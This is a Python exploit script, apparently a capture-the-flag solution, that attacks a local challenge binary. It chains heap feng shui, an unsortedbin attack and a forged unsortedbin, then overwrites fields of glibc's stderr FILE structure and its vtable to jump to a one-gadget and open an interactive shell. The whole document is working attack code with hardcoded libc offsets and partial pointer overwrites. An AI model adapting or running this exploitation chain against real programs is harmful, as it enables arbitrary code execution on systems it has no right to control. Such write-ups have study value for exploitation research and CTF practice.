from ptrlib import *
from time import sleep

WAIT = 0.01
def add(index, size):
    sock.sendline("1")
    sleep(WAIT)
    sock.sendline(str(index))
    sleep(WAIT)
    sock.sendline(str(size))
    sleep(WAIT)
    return
def edit(index, data):
    sock.sendline("2")
    sleep(WAIT)
    sock.sendline(str(index))
    sleep(WAIT)
    sock.send(data)
    sleep(WAIT)
    return
def delete(index):
    sock.sendline("3")
    sleep(WAIT)
    sock.sendline(str(index))
    sleep(WAIT)
    return

def offset2size(offset):
    assert offset % 8 == 0
    return (offset * 2) + 0x10
def overlap(A, B, tmp1, tmp2, size, pos):
    add(tmp1, 0x40)
    add(A, 0x10)
    add(B, 0x10)
    add(tmp2, 0x40)
    delete(tmp1)
    delete(tmp2)
    edit(tmp2, pos)
    add(tmp1, 0x40)
    add(tmp2, 0x40)
    payload  = p64(0) + p64((size+0x10) | 1)
    payload += b'A' * 0x10
    payload += p64(0) + p64((size+0x10) | 1)
    edit(tmp2, payload)
    return

sock = Process("../distfiles/chall")

size_dumped_main_arena_start = offset2size(0x7ffff7dd1938 - 0x7ffff7dcfc50)
size_pedantic = offset2size(0x7ffff7dd1948 - 0x7ffff7dcfc50)
size_morecore = offset2size(0x7ffff7dd04d8 - 0x7ffff7dcfc50)
size_flags = offset2size(0x7ffff7dd0680 - 0x7ffff7dcfc50)
size_write_ptr = offset2size(0x7ffff7dd0680 + 0x28 - 0x7ffff7dcfc50)
size_buf_base = offset2size(0x7ffff7dd0680 + 0x38 - 0x7ffff7dcfc50)
size_buf_end = offset2size(0x7ffff7dd0680 + 0x40 - 0x7ffff7dcfc50)
size_vtable = offset2size(0x7ffff7dd0680 + 0xd8 - 0x7ffff7dcfc50)
size_s_alloc = offset2size(0x7ffff7dd0680 + 0xe0 - 0x7ffff7dcfc50)

""" Stage 1: heap Feng Shui """
# chunk for unsortedbin attack
add(0, 0x420)
# chunk for largebin
add(3, 0x420)
add(1, 0x420)
delete(1)
delete(3)
add(3, 0x430)
add(2, 0x430)
## prepare
add(4, size_pedantic)
add(5, size_dumped_main_arena_start)
add(6, size_flags)
add(7, size_write_ptr)
add(8, size_buf_base)
add(13, size_vtable)
overlap(9, 10, 11, 12, size_buf_end, b'\xc0')
overlap(14, 15, 16, 17, size_s_alloc, b'\xa0')
payload = p64(0) + p64(0x21)
payload *= 0x200
add(18, len(payload))
edit(18, payload)
# link to largebin and set NON_MAIN_ARENA
delete(2)
edit(1, p64(0) + p64(0x440 | 0b101)) # set 2's NON_MAIN_ARENA to 1

""" Stage 2: unsortedbin attack """
delete(0)
edit(0, p64(0) + b'\x30\x19\xdd') # edit(0, p64(0) + b'\x30\x29')
add(0, 0x420)

""" Stage 3: fake unsortedbin """
# write 0x440 to dumped_main_arena_end
delete(5)
edit(5, p64(0x440))
add(5, size_dumped_main_arena_start)
# set pedantic to writable pointer
delete(4) # free for pedantic

""" Stage 4: tampering stderr """
# write 0 to _flags
delete(6)
edit(6, p64(0))
add(6, size_flags)
# write large value to _IO_write_ptr
delete(7)
edit(7, p64(0x7fffffffffffffff))
add(7, size_write_ptr)
# write offset to _IO_buf_base
offset = 0x7ffff7a7f190 - 0x7ffff7a332c5 # __default_morecore - one gadget
delete(8)
edit(8, p64(offset))
add(8, size_buf_base)
# write &__default_morecore to _IO_buf_end
delete(10)
delete(9)
edit(9, b'\xc0')
add(9, size_buf_end)
edit(12, p64(0) + p64((size_morecore+0x10) | 1))
delete(9)
edit(12, p64(0) + p64((size_buf_end+0x10) | 1))
add(9, size_buf_end)
edit(12, p64(0) + p64((size_morecore+0x10) | 1))
add(10, size_morecore) # pop back __default_morecore
# write &_IO_str_jumps to vtable
delete(13)
edit(13, b'\x60\xc3') # edit(13, b'\x60\xd3')
add(13, size_vtable)
# write call rax gadget to _s._allocate_buffer
delete(15)
delete(14)
edit(14, b'\xa0')
add(14, size_s_alloc)
edit(17, p64(0) + p64((size_morecore+0x10) | 1))
delete(14)
edit(17, p64(0) + p64((size_s_alloc+0x10) | 1))
edit(14, b'\x10\x16') # edit(14, b'\x10\x17')
add(14, size_s_alloc)

""" Stage 5: force stderr activity """
add(19, 0x30)

sock.interactive()
